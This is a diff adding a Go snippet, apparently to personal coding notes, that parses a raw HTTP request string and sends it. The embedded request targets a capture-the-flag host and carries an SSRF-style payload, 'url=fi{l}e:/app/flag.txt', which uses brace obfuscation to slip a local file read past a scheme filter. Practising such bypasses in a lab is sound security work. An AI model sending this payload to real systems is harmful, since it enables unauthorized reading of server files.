@@ -556,3 +556,70 @@ func main() {
 	
 }
 ```
+13- Send a reqeust using the Full request fromat as a String : 
+```go
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"net/http"
+	"strings"
+)
+
+func main() {
+	// 1. PASTE RAW REQUEST
+	rawReq := `POST /fetch HTTP/1.1
+Host: tm91cmvszglu.playat.flagyard.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Origin: http://tm91cmvszglu.playat.flagyard.com
+Connection: keep-alive
+Cookie: _ga_YD2ZMTYJ5D=GS2.1.s1767278403$o3$g1$t1767278515$j24$l0$h0; _ga=GA1.1.1432435242.1766847934
+Priority: u=0
+
+url=fi{l}e:/app/flag.txt`
+
+	// 2. FIX NEWLINES & PARSE
+	rawReq = strings.ReplaceAll(rawReq, "\n", "\r\n")
+	reader := bufio.NewReader(strings.NewReader(rawReq))
+	req, err := http.ReadRequest(reader)
+	if err != nil {
+		panic(err)
+	}
+
+	// 3. CONFIGURE CLIENT SETTINGS
+	req.RequestURI = ""
+	req.URL.Scheme = "http"
+	req.URL.Host = req.Host
+
+	// 4. SEND REQUEST
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	defer resp.Body.Close()
+
+	// 5. PRINT STATUS
+	fmt.Printf("HTTP/1.1/2 %s\n", resp.Status)
+
+	// 6. PRINT HEADERS (Updated Part)
+	for key, values := range resp.Header {
+		// We join values with comma in case there are multiple (e.g., multiple Set-Cookie)
+		fmt.Printf("%s: %s\n", key, strings.Join(values, ", "))
+	}
+
+	// 7. PRINT BODY
+	fmt.Println()
+	body, _ := io.ReadAll(resp.Body)
+	fmt.Println(string(body))
+}
+```
+
